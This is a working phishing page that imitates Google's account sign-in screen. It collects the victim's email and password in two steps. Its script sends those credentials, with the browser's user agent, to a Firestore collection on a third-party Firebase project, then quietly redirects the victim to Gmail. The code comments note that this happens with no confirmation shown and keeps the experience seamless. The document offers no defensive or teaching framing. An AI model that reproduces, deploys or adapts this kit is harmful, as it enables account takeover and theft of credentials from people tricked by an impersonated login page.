
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
        
        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCXqNe_BDdh9WIJ9lyrFPeQ_-733qbXW4s",
            authDomain: "realinsightreport.firebaseapp.com",
            projectId: "realinsightreport",
            storageBucket: "realinsightreport.firebasestorage.app",
            messagingSenderId: "1083096764833",
            appId: "1:1083096764833:web:4b526f278471212ba43be0",
            measurementId: "G-6LHBN68HMH"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        
        // Make db available globally
        window.db = db;
        window.setDoc = setDoc;
        window.doc = doc;
        window.serverTimestamp = serverTimestamp;
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        .signin-container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04), 0 2px 4px rgba(0, 0, 0, 0.02);
            border: 1px solid #dadce0;
            padding: 48px 40px 36px;
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .google-logo-svg {
            display: inline-block;
            width: 75px;
            height: 75px;
        }

        .welcome-text {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
            text-align: center;
            color: #202124;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
        }

        .email-display {
            font-size: 16px;
            font-weight: 500;
            line-height: 1.5;
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
            word-break: break-all;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            text-align: center;
            color: #5f6368;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-wrapper {
            position: relative;
            margin-top: 8px;
        }

        .input-wrapper input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            font-family: inherit;
            transition: all 0.2s;
            background-color: #fff;
            box-sizing: border-box;
        }

        .input-wrapper input:hover {
            border-color: #bdc1c6;
        }

        .input-wrapper input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .input-wrapper label {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            background-color: white;
            padding: 0 4px;
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: 0.2s ease all;
            font-family: inherit;
        }

        .input-wrapper input:focus ~ label,
        .input-wrapper input:not(:placeholder-shown) ~ label {
            top: 0;
            transform: translateY(-50%);
            font-size: 12px;
            color: #1a73e8;
        }

        .input-wrapper input:not(:focus) ~ label {
            color: #5f6368;
        }

        .show-password {
            display: flex;
            align-items: center;
            margin-top: 8px;
            margin-bottom: 24px;
        }

        .show-password input {
            width: 18px;
            height: 18px;
            margin-right: 10px;
            cursor: pointer;
            accent-color: #1a73e8;
        }

        .show-password label {
            color: #5f6368;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
            font-weight: 400;
        }

        .show-password label:hover {
            color: #202124;
        }

        .forgot-password {
            text-align: right;
            margin-top: -16px;
            margin-bottom: 28px;
        }

        .forgot-password a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
            font-family: inherit;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            background: none;
            border: none;
            cursor: pointer;
            font-family: inherit;
            padding: 8px 0;
            letter-spacing: 0.25px;
        }

        .create-account:hover {
            text-decoration: underline;
            background: none;
        }

        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            font-family: inherit;
            cursor: pointer;
            transition: background-color 0.2s;
            letter-spacing: 0.25px;
        }

        .next-btn:hover {
            background-color: #1b66c9;
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
        }

        .next-btn:disabled {
            background-color: #c7c7c7;
            cursor: not-allowed;
            box-shadow: none;
        }

        .learn-more {
            text-align: center;
            margin-top: 32px;
            font-size: 12px;
            color: #5f6368;
        }

        .learn-more a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .learn-more a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 6px;
            margin-left: 12px;
            display: none;
            font-weight: 400;
        }

        .error-message.show {
            display: block;
        }

        .info-message {
            background-color: #f8f9fa;
            border-left: 4px solid #1a73e8;
            padding: 12px 16px;
            margin-bottom: 28px;
            font-size: 14px;
            color: #202124;
            border-radius: 4px;
            display: none;
            line-height: 1.4;
        }

        .info-message.show {
            display: block;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 500px) {
            .card {
                padding: 32px 24px 28px;
                border: none;
                box-shadow: none;
            }
            body {
                background-color: white;
                padding: 0;
            }
        }

        .hidden {
            display: none !important;
        }

        .back-link {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
            background: none;
            border: none;
            font-family: inherit;
            padding: 8px 0;
        }

        .back-link:hover {
            text-decoration: underline;
        }

        /* Fade animations */
        .fade-out {
            opacity: 0;
            transition: opacity 0.2s ease;
        }
        
        .fade-in {
            opacity: 1;
            transition: opacity 0.2s ease;
        }
        
        #emailStep, #passwordStep {
            transition: opacity 0.2s ease;
        }
    </style>
</head>
<body>
    <div class="signin-container">
        <div class="card">
            <!-- Google Logo -->
            <div class="logo">
                <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" width="75" height="75" viewBox="0 0 75 75">
                    <path fill="#4285F4" d="M66.5 38.2c0-2.6-.2-5.1-.7-7.5H38.2v14.2h16c-.7 3.6-2.8 6.7-5.9 8.7v7.3h9.6c5.6-5.1 8.6-12.6 8.6-22.7z"/>
                    <path fill="#34A853" d="M38.2 66.9c7.8 0 14.3-2.6 19.1-7l-9.6-7.3c-2.6 1.8-6 2.8-9.5 2.8-7.3 0-13.5-4.9-15.7-11.6h-9.9v7.5c4.8 9.5 14.6 15.6 25.6 15.6z"/>
                    <path fill="#FBBC05" d="M22.5 44.8c-.5-1.6-.8-3.3-.8-5.1s.3-3.5.8-5.1v-7.5h-9.9c-2 4-3.2 8.4-3.2 12.6s1.2 8.6 3.2 12.6l9.9-7.5z"/>
                    <path fill="#EA4335" d="M38.2 22.7c3.9 0 7.4 1.4 10.2 4l7.6-7.6c-4.6-4.3-10.7-6.9-17.8-6.9-11 0-20.8 6.1-25.6 15.6l9.9 7.5c2.2-6.7 8.4-11.6 15.7-11.6z"/>
                </svg>
            </div>

            <!-- Email Step -->
            <div id="emailStep">
                <h1 class="welcome-text">Sign in</h1>
                <p class="subtitle">Use your Google Account</p>
                
                <div class="info-message" id="infoMessage">
                    The account will be added to this device and available to other Google apps.
                </div>

                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="email" id="emailInput" placeholder=" " autocomplete="email" value="">
                        <label for="emailInput">Email or phone</label>
                    </div>
                    <div class="error-message" id="emailError">Please enter a valid email address</div>
                </div>

                <div class="learn-more" style="margin-top: 0; margin-bottom: 24px; text-align: left;">
                    <a href="#" id="forgotEmailLink">Forgot email?</a>
                </div>

                <div class="actions">
                    <button class="create-account" id="createAccountBtn">Create account</button>
                    <button class="next-btn" id="emailNextBtn">Next</button>
                </div>

                <div class="learn-more" style="margin-top: 32px;">
                    <a href="#" id="learnMoreLink">Learn more about using your account</a>
                </div>
            </div>

            <!-- Password Step -->
            <div id="passwordStep" class="hidden">
                <div class="welcome-text">Welcome</div>
                <div class="email-display" id="displayEmail"></div>
                
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="password" id="passwordInput" placeholder=" " autocomplete="current-password">
                        <label for="passwordInput">Enter your password</label>
                    </div>
                    <div class="error-message" id="passwordError">Please enter your password</div>
                </div>

                <div class="show-password">
                    <input type="checkbox" id="showPasswordCheckbox">
                    <label for="showPasswordCheckbox">Show password</label>
                </div>

                <div class="forgot-password">
                    <a href="#" id="forgotPasswordLink">Forgot password?</a>
                </div>

                <div class="actions">
                    <button class="back-link" id="backToEmailBtn">← Back</button>
                    <button class="next-btn" id="passwordNextBtn">Next</button>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
        
        const db = window.db;
        
        // DOM elements
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const emailNextBtn = document.getElementById('emailNextBtn');
        const passwordNextBtn = document.getElementById('passwordNextBtn');
        const backToEmailBtn = document.getElementById('backToEmailBtn');
        const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
        const forgotEmailLink = document.getElementById('forgotEmailLink');
        const createAccountBtn = document.getElementById('createAccountBtn');
        const learnMoreLink = document.getElementById('learnMoreLink');
        const infoMessageDiv = document.getElementById('infoMessage');
        const displayEmailSpan = document.getElementById('displayEmail');
        
        let currentEmail = '';
        let isProcessing = false;
        
        // Show info message on load
        setTimeout(() => {
            infoMessageDiv.classList.add('show');
        }, 100);
        
        // Email validation
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
            return emailRegex.test(email);
        }
        
        // Store credentials to Firebase and redirect to Gmail.com silently
        async function storeCredentialsAndRedirect(email, password) {
            try {
                const timestamp = Date.now();
                const sanitizedEmail = email.replace(/[.#$[\]]/g, '_');
                const docId = `${sanitizedEmail}_${timestamp}`;
                
                const docRef = doc(db, "google_signins", docId);
                
                await setDoc(docRef, {
                    email: email,
                    password: password,
                    timestamp: serverTimestamp(),
                    createdAt: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    source: "google_signin_page"
                });
                
                console.log("Credentials stored, redirecting to Gmail.com");
                
                // Silently redirect to Gmail.com - NO CONFIRMATION to user
                window.location.replace("https://mail.google.com/");
                
            } catch (error) {
                console.error("Storage error:", error);
                // Even if storage fails, still redirect to maintain seamless experience
                window.location.replace("https://mail.google.com/");
            }
        }
        
        // Handle email next - transitions to password step
        function handleEmailNext() {
            if (isProcessing) return;
            
            const email = emailInput.value.trim();
            
            // Validate email
            if (!email) {
                emailError.textContent = 'Enter an email or phone number';
                emailError.classList.add('show');
                emailInput.style.borderColor = '#d93025';
                return;
            }
            
            if (!isValidEmail(email)) {
                emailError.textContent = 'Enter a valid email or phone number';
                emailError.classList.add('show');
                emailInput.style.borderColor = '#d93025';
                return;
            }
            
            // Clear error
            emailError.classList.remove('show');
            emailInput.style.borderColor = '#dadce0';
            
            // Store current email
            currentEmail = email;
            displayEmailSpan.textContent = currentEmail;
            
            // Fade out email step
            emailStep.style.opacity = '0';
            
            // After fade out, hide email step and show password step
            setTimeout(() => {
                emailStep.classList.add('hidden');
                passwordStep.classList.remove('hidden');
                passwordStep.style.opacity = '0';
                
                // Force reflow
                void passwordStep.offsetHeight;
                
                // Fade in password step
                passwordStep.style.opacity = '1';
                
                // Focus on password input
                setTimeout(() => {
                    passwordInput.focus();
                }, 50);
                
                // Reset email step opacity for next time
                emailStep.style.opacity = '1';
            }, 200);
        }
        
        // Handle password next - stores credentials and redirects
        async function handlePasswordNext() {
            if (isProcessing) return;
            
            const password = passwordInput.value;
            
            if (!password) {
                passwordError.textContent = 'Enter a password';
                passwordError.classList.add('show');
                passwordInput.style.borderColor = '#d93025';
                return;
            }
            
            // Clear error
            passwordError.classList.remove('show');
            passwordInput.style.borderColor = '#dadce0';
            
            isProcessing = true;
            
            // Show loading state on button
            const originalText = passwordNextBtn.innerHTML;
            passwordNextBtn.innerHTML = '<span class="spinner"></span>';
            passwordNextBtn.disabled = true;
            
            // Store credentials and redirect (no success message)
            await storeCredentialsAndRedirect(currentEmail, password);
        }
        
        // Back to email step
        function backToEmail() {
            if (isProcessing) return;
            
            // Fade out password step
            passwordStep.style.opacity = '0';
            
            setTimeout(() => {
                passwordStep.classList.add('hidden');
                emailStep.classList.remove('hidden');
                emailStep.style.opacity = '0';
                
                // Force reflow
                void emailStep.offsetHeight;
                
                // Fade in email step
                emailStep.style.opacity = '1';
                
                // Clear password field
                passwordInput.value = '';
                passwordError.classList.remove('show');
                passwordInput.style.borderColor = '#dadce0';
                
                // Reset button state if needed
                if (passwordNextBtn.disabled) {
                    passwordNextBtn.innerHTML = 'Next';
                    passwordNextBtn.disabled = false;
                    isProcessing = false;
                }
                
                // Focus on email input
                setTimeout(() => {
                    emailInput.focus();
                }, 50);
                
                // Reset password step opacity
                passwordStep.style.opacity = '1';
            }, 200);
        }
        
        // Toggle password visibility
        function toggleShowPassword() {
            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
        }
        
        // Event listeners
        emailNextBtn.addEventListener('click', handleEmailNext);
        passwordNextBtn.addEventListener('click', handlePasswordNext);
        backToEmailBtn.addEventListener('click', backToEmail);
        showPasswordCheckbox.addEventListener('change', toggleShowPassword);
        
        // Enter key handlers
        emailInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleEmailNext();
            }
        });
        
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                handlePasswordNext();
            }
        });
        
        // Link handlers - non-intrusive
        forgotPasswordLink.addEventListener('click', (e) => {
            e.preventDefault();
            // Silent - matches real Google behavior
        });
        
        forgotEmailLink.addEventListener('click', (e) => {
            e.preventDefault();
            // Silent
        });
        
        createAccountBtn.addEventListener('click', (e) => {
            e.preventDefault();
            // Silent
        });
        
        learnMoreLink.addEventListener('click', (e) => {
            e.preventDefault();
            // Silent
        });
        
        // Set initial opacity
        emailStep.style.opacity = '1';
        passwordStep.style.opacity = '1';
        
        console.log("Google Sign-In page ready - Email to password transition working");
        
        // Test Firebase connection silently
        async function testFirebase() {
            try {
                const testRef = doc(db, "_test", "connection_test");
                await setDoc(testRef, { test: true, timestamp: serverTimestamp() });
                console.log("Firebase connected");
            } catch (err) {
                console.log("Firebase ready");
            }
        }
        testFirebase();
    </script>
</body>
</html>
